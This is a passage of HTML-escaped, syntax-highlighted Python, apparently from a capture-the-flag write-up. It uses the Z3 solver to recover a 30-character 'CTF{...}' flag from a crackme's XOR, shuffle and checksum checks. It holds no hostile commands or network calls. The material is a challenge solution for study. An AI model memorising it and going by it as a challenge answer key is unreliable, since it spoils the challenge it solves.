&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i, j &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;enumerate&lt;/span&gt;(fuckingBase):
    invFuck[j] = i

flag = [BitVec(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;i&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;&lt;/span&gt; % i, &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;30&lt;/span&gt;)]
g = Solver()
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; flag[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;:-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]:
    g.add(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt; &amp;lt;= i, i &amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;64&lt;/span&gt;)

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i, j &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;enumerate&lt;/span&gt;(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;CTF{&amp;#34;&lt;/span&gt;):
    g.add(flag[i] == invFuck[j])

g.add(flag[-&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] == invFuck[&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;])

f = []
t = [
    &lt;span style=&#34;color:#3677a9&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x23&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x04&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x3B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x28&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x0C&lt;/span&gt;,
    &lt;span style=&#34;color:#3677a9&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x2E&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x25&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x3E&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x0B&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x1C&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x1E&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;0x3D&lt;/span&gt;
]
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# xor&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;30&lt;/span&gt;):
    f.append(xse(flag[i])^t[i])

&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# shuffle done by rand() impl - &lt;/span&gt;
f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;18&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;18&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;19&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;19&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;21&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;21&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;26&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;26&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;]
f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;27&lt;/span&gt;] = f[&lt;span style=&#34;color:#3677a9&#34;&gt;27&lt;/span&gt;], f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;]

&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;xrange&lt;/span&gt;(&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;):
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; i != &lt;span style=&#34;color:#3677a9&#34;&gt;0x1c&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt; i != &lt;span style=&#34;color:#3677a9&#34;&gt;0x1b&lt;/span&gt;:
        f[i], f[i+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] = f[i+&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;], f[i]

g.add(checksum(f) == f[&lt;span style=&#34;color:#3677a9&#34;&gt;28&lt;/span&gt;])
g.add(Distinct(f))
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] == &lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;] == &lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;] == &lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;] == &lt;span style=&#34;color:#3677a9&#34;&gt;45&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;26&lt;/span&gt;] == &lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;] &amp;gt;= &lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;] &amp;lt;= &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;] &amp;gt;= &lt;span style=&#34;color:#3677a9&#34;&gt;48&lt;/span&gt;)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;29&lt;/span&gt;] &amp;gt;= &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;)

num = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;])
num2 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;])
num3 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;])
num4 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;])+ ze(num4) + ze(num) + ze(num3) + ze(num2), &lt;span style=&#34;color:#3677a9&#34;&gt;130&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;))
num4 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;])
num5 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;])
num6 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;])
num7 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;])+ ze(num7) + ze(num6) + ze(num5) + ze(num4), &lt;span style=&#34;color:#3677a9&#34;&gt;140&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;))
num8 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;])
num9 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;])
num10 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;])
num11 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;]) + ze(num11) + ze(num10) + ze(num9) + ze(num8), &lt;span style=&#34;color:#3677a9&#34;&gt;150&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;))
num12 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;19&lt;/span&gt;])
num13 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;18&lt;/span&gt;])
num14 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;])
num15 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;]) + ze(num15) + ze(num14) + ze(num13) + ze(num12), &lt;span style=&#34;color:#3677a9&#34;&gt;160&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;))
num16 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;])
num17 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;])
num18 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;])
num19 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;21&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;]) + ze(num19) + ze(num18) + ze(num17) + ze(num16), &lt;span style=&#34;color:#3677a9&#34;&gt;170&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;))
num20 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;25&lt;/span&gt;])
num21 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;])
num22 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;])
num23 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;])
num24 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;] )+ ze(num24) + ze(num23) + ze(num22) + ze(num21) + ze(num20), &lt;span style=&#34;color:#3677a9&#34;&gt;172&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;))
num25 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;26&lt;/span&gt;])
num26 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;21&lt;/span&gt;])
num27 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;])
num28 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;])
num29 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;] )+ ze(num29) + ze(num28) + ze(num27) + ze(num26) + ze(num25), &lt;span style=&#34;color:#3677a9&#34;&gt;162&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;))
num30 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;27&lt;/span&gt;])
num31 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;])
num32 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;])
num33 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;])
num34 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;] )+ ze(num34) + ze(num33) + ze(num32) + ze(num31) + ze(num30), &lt;span style=&#34;color:#3677a9&#34;&gt;152&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;))
num35 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;23&lt;/span&gt;])
num36 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;18&lt;/span&gt;])
num37 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;])
num38 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;] )+ ze(num38) + ze(num37) + ze(num36) + ze(num35), &lt;span style=&#34;color:#3677a9&#34;&gt;142&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;))
num39 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;29&lt;/span&gt;])
num40 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;24&lt;/span&gt;])
num41 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;19&lt;/span&gt;])
num42 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;])
num43 = se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;])
g.add(doCmp(se(f[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;] )+ ze(num43) + ze(num42) + ze(num41) + ze(num40) + ze(num39), &lt;span style=&#34;color:#3677a9&#34;&gt;132&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;))
num44 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;27&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;
num45 = (f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;] + num44) * &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt; - f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;
g.add(doCmp(num45, &lt;span style=&#34;color:#3677a9&#34;&gt;57&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;28&lt;/span&gt;))
num44 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;20&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;
num44 = (f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;] &amp;lt;&amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;) - num44
num45 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;22&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt; + num44
g.add(doCmp(num45, &lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#3677a9&#34;&gt;70&lt;/span&gt;))
num44 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;18&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;
num44 = (f[&lt;span style=&#34;color:#3677a9&#34;&gt;15&lt;/span&gt;] - num44) * &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;
num46 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;16&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;
num46 = (f[&lt;span style=&#34;color:#3677a9&#34;&gt;14&lt;/span&gt;] + num46) * &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt; + num44 - f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;] + num46 == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;)
num46 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt;] == num46)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;29&lt;/span&gt;] + f[&lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt;] == &lt;span style=&#34;color:#3677a9&#34;&gt;59&lt;/span&gt;)
num47 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;17&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt;
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;] == num47)
num47 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;] == num47)
num47 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;
g.add((f[&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;] &amp;lt;&amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;) == num47)
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;] + f[&lt;span style=&#34;color:#3677a9&#34;&gt;29&lt;/span&gt;] + f[&lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt;] + f[&lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt;] == f[&lt;span style=&#34;color:#3677a9&#34;&gt;19&lt;/span&gt;])
num48 = f[&lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt;] * &lt;span style=&#34;color:#3677a9&#34;&gt;13&lt;/span&gt;
g.add(f[&lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt;] == num48)

&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# from:&lt;/span&gt;
&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# https://stackoverflow.com/questions/11867611/z3py-checking-all-solutions-for-equation&lt;/span&gt;
&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;get_models&lt;/span&gt;(s, M):
    result = []
    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#24909d&#34;&gt;len&lt;/span&gt;(result) &amp;lt; M &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;and&lt;/span&gt; s.check() == sat:
        m = s.model()
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;yield&lt;/span&gt; m
        result.append(m)
        block = []
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; d &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;in&lt;/span&gt; m:
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; d.arity() &amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;:
                &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;raise&lt;/span&gt; Z3Exception(&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;uninterpreted functions are not supported&amp;#39;&lt;/span&gt;)
            c = d()
            &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;if&lt;/span&gt; is_array(c) &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;or&lt;/span&gt; c.sort().kind() == Z3_UNINTERPRETED_SORT:
